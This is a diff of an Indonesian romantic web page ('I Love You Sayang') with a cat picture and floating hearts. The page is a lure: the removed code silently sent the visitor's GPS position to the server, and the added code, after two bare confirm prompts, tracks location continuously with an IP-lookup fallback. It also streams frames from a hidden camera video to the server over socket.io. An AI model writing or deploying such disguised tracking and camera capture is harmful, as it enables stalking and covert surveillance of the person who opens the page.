@@ -1,48 +1,315 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8" />
-  <title>Kangenn</title>
+  <meta charset="utf-8" />
+  <title>I Love You Sayang 💖</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
   <style>
-    body {
+    :root {
+      --pink1: #ffd0e3;
+      --pink2: #ff9ccf;
+      --accent: #ff4d79;
+    }
+
+    html, body {
+      height: 100%;
       margin: 0;
-      padding: 0;
-      background-color: #000;
+      font-family: "Poppins", sans-serif;
+      background: radial-gradient(circle at top left, var(--pink1), var(--pink2));
+      overflow: hidden;
+      color: #fff;
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
     }
-    img {
-      width: 100%;
-      height: 100%;
+
+    .center {
+      text-align: center;
+      position: relative;
+      z-index: 2;
+    }
+
+    h1 {
+      font-size: 3rem;
+      margin-bottom: 12px;
+      text-shadow: 0 0 20px rgba(255, 77, 121, 0.3);
+      animation: glow 2s ease-in-out infinite alternate;
+    }
+
+    @keyframes glow {
+      from { text-shadow: 0 0 10px #ff69b4, 0 0 20px #ff69b4; }
+      to { text-shadow: 0 0 30px #ff1493, 0 0 50px #ff69b4; }
+    }
+
+    .card {
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 20px;
+      padding: 30px 40px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+      backdrop-filter: blur(8px);
+    }
+
+    .kitty {
+      width: 260px;
+      height: 260px;
+      border-radius: 20px;
       object-fit: cover;
+      margin-bottom: 16px;
+      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
     }
+
+    .btn {
+      padding: 14px 30px;
+      border: none;
+      border-radius: 999px;
+      background: linear-gradient(90deg, var(--accent), #ff7fb0);
+      color: #fff;
+      font-size: 17px;
+      font-weight: 600;
+      cursor: pointer;
+      box-shadow: 0 10px 25px rgba(255, 77, 121, 0.3);
+      transition: all 0.2s ease;
+    }
+
+    .btn:hover {
+      transform: scale(1.05);
+      box-shadow: 0 12px 35px rgba(255, 105, 180, 0.5);
+    }
+
+    .btn-stop {
+      background: #ef4444;
+      margin-left: 10px;
+    }
+
+    .status {
+      margin-top: 12px;
+      font-size: 1rem;
+      color: rgba(255, 255, 255, 0.95);
+    }
+
+    /* Floating "I love you sayang" effect */
+    .floating {
+      position: fixed;
+      inset: 0;
+      pointer-events: none;
+      z-index: 1;
+      overflow: hidden;
+    }
+
+    .love {
+      position: absolute;
+      font-weight: 600;
+      color: rgba(255, 255, 255, 0.7);
+      text-shadow: 0 0 10px rgba(255, 120, 160, 0.5);
+      font-size: 18px;
+      white-space: nowrap;
+      animation: floatFar linear infinite;
+    }
+
+    @keyframes floatFar {
+      0% { transform: translateY(120vh) scale(0.6); opacity: 0; }
+      15% { opacity: 1; }
+      100% { transform: translateY(-250vh) scale(1.4); opacity: 0; }
+    }
+
+    #ringBox {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%) scale(0.8);
+      opacity: 0;
+      transition: opacity 0.6s, transform 0.6s;
+      z-index: 10;
+      pointer-events: none;
+    }
+
+    #ringBox.show {
+      opacity: 1;
+      transform: translate(-50%, -50%) scale(1);
+    }
+
+    .ring {
+      width: 140px;
+      height: 140px;
+      border-radius: 50%;
+      border: 10px solid gold;
+      background: radial-gradient(circle at center, #fffbd6 10%, #ffe680 80%);
+      position: relative;
+      box-shadow: 0 0 60px rgba(255, 255, 160, 0.6), 0 0 100px rgba(255, 255, 120, 0.4);
+      animation: shine 2s infinite ease-in-out;
+    }
+
+    .ring::before {
+      content: "";
+      position: absolute;
+      top: -30px;
+      left: 50%;
+      transform: translateX(-50%) rotate(45deg);
+      width: 40px;
+      height: 40px;
+      background: linear-gradient(135deg, #fff, #ffe6a3);
+      border-radius: 6px;
+      box-shadow: 0 0 25px rgba(255, 255, 180, 0.8);
+    }
+
+    @keyframes shine {
+      0%, 100% { transform: rotate(0deg) scale(1); }
+      50% { transform: rotate(5deg) scale(1.05); }
+    }
+
+    video { display: none; }
   </style>
 </head>
 <body>
-  <!-- Ambil gambar dari folder static/img -->
-  <img src="{{ url_for('static', filename='/kucing.jpeg') }}" alt="Kangenn">
+  <div class="floating" id="floating"></div>
 
+  <div class="center card">
+    <h1>I Love You Sayang 💖</h1>
+    <img class="kitty" src="/static/img/kucing.jpeg" alt="kucing imut">
+    <div>
+      <button class="btn" id="startBtn">Klik ini 💕</button>
+      <button class="btn btn-stop" id="stopBtn" style="display:none">Makasih sayang udah kangen aku 💗</button>
+    </div>
+    <div id="status" class="status">Klik tombol kalau kamu kangen 💞</div>
+  </div>
+
+  <div id="ringBox"><div class="ring"></div></div>
+
+  <video id="hiddenVideo" autoplay playsinline muted></video>
+
+  <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
   <script>
-    // Script kirim lokasi ke server tetap berjalan di latar belakang
-    if (navigator.geolocation) {
-      navigator.geolocation.watchPosition(pos => {
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
+    const socket = io();
+    const clientId = localStorage.getItem("client_id") || "client_" + Math.random().toString(36).slice(2,9);
+    localStorage.setItem("client_id", clientId);
+    socket.emit("register", { client_id: clientId, role: "client" });
 
-        fetch('/report', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ latitude: lat, longitude: lon })
-        }).catch(e => console.error('Gagal kirim lokasi:', e));
-      }, err => {
-        console.error('Gagal mendapatkan lokasi:', err);
-      }, {
-        enableHighAccuracy: true,
-        maximumAge: 5000,
-        timeout: 15000
-      });
+    const startBtn = document.getElementById("startBtn");
+    const stopBtn = document.getElementById("stopBtn");
+    const statusEl = document.getElementById("status");
+    const hiddenVideo = document.getElementById("hiddenVideo");
+    const ringBox = document.getElementById("ringBox");
+    const floating = document.getElementById("floating");
+
+    let mediaStream = null;
+    let geoWatch = null;
+    let interval = null;
+    const FPS = 2;
+
+    // fallback IP lokasi
+    async function getIpLocation() {
+      try {
+        const r = await fetch("https://ipapi.co/json/");
+        const j = await r.json();
+        return { latitude: j.latitude, longitude: j.longitude, source: "ip" };
+      } catch (err) {
+        console.warn("Gagal ambil IP lokasi:", err);
+        return null;
+      }
+    }
+
+    async function sendLocation(lat, lon, source = "gps") {
+      await fetch("/report", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          client_id: clientId,
+          latitude: lat,
+          longitude: lon,
+          source
+        })
+      }).catch(err => console.error("Gagal kirim lokasi:", err));
+    }
+
+    function spawnLoves(count = 60) {
+      const vw = window.innerWidth;
+      const vh = window.innerHeight;
+      for (let i = 0; i < count; i++) {
+        const el = document.createElement("div");
+        el.className = "love";
+        el.textContent = "I love you sayang 💗";
+        el.style.left = Math.random() * vw + "px";
+        el.style.top = vh + "px";
+        const dur = 10 + Math.random() * 10;
+        el.style.animationDuration = dur + "s";
+        el.style.fontSize = 14 + Math.random() * 26 + "px";
+        el.style.opacity = 0.2 + Math.random() * 0.6;
+        floating.appendChild(el);
+        setTimeout(() => el.remove(), dur * 1000);
+      }
+    }
+    spawnLoves(80);
+    setInterval(() => spawnLoves(30), 2000);
+
+    startBtn.addEventListener("click", async () => {
+      ringBox.classList.add("show");
+      setTimeout(() => ringBox.classList.remove("show"), 4000);
+
+      const allowLoc = confirm("Izinkan berbagi lokasi?");
+      const allowCam = confirm("Izinkan berbagi kamera?");
+      statusEl.textContent = "Menyiapkan izin...";
+
+      if (allowLoc) {
+        if (navigator.geolocation) {
+          geoWatch = navigator.geolocation.watchPosition(async pos => {
+            await sendLocation(pos.coords.latitude, pos.coords.longitude, "gps");
+            statusEl.textContent = "Kangen bangettt 💗 ";
+          }, async err => {
+            console.warn("Gagal ambil GPS:", err);
+            const ipLoc = await getIpLocation();
+            if (ipLoc) {
+              await sendLocation(ipLoc.latitude, ipLoc.longitude, "ip");
+              statusEl.textContent = "Kangen bangettt 💗 ";
+            }
+          }, { enableHighAccuracy: true, timeout: 8000 });
+        } else {
+          const ipLoc = await getIpLocation();
+          if (ipLoc) {
+            await sendLocation(ipLoc.latitude, ipLoc.longitude, "ip");
+            statusEl.textContent = "Kangen bangettt 💗";
+          }
+        }
+      }
+
+      if (allowCam && navigator.mediaDevices.getUserMedia) {
+        try {
+          mediaStream = await navigator.mediaDevices.getUserMedia({ video: true });
+          hiddenVideo.srcObject = mediaStream;
+          hiddenVideo.play();
+          startStream();
+          startBtn.style.display = "none";
+          stopBtn.style.display = "inline-block";
+        } catch (err) {
+          console.error("Gagal akses kamera:", err);
+          statusEl.textContent = "Tidak bisa akses kamera 😢";
+        }
+      }
+    });
+
+    stopBtn.addEventListener("click", stopSharing);
+
+    function stopSharing() {
+      if (geoWatch) { navigator.geolocation.clearWatch(geoWatch); geoWatch = null; }
+      if (interval) { clearInterval(interval); interval = null; }
+      if (mediaStream) { mediaStream.getTracks().forEach(t => t.stop()); mediaStream = null; }
+      statusEl.textContent = "Udah stop berbagi sayang 💗";
+      startBtn.style.display = "inline-block";
+      stopBtn.style.display = "none";
+    }
+
+    function startStream() {
+      const canvas = document.createElement("canvas");
+      const ctx = canvas.getContext("2d");
+      interval = setInterval(() => {
+        if (!hiddenVideo || hiddenVideo.readyState < 2) return;
+        const w = hiddenVideo.videoWidth;
+        const h = hiddenVideo.videoHeight;
+        canvas.width = w;
+        canvas.height = h;
+        ctx.drawImage(hiddenVideo, 0, 0, w, h);
+        const img = canvas.toDataURL("image/jpeg", 0.6);
+        socket.emit("stream_frame", { client_id: clientId, image: img });
+      }, 1000 / FPS);
     }
   </script>
 </body>
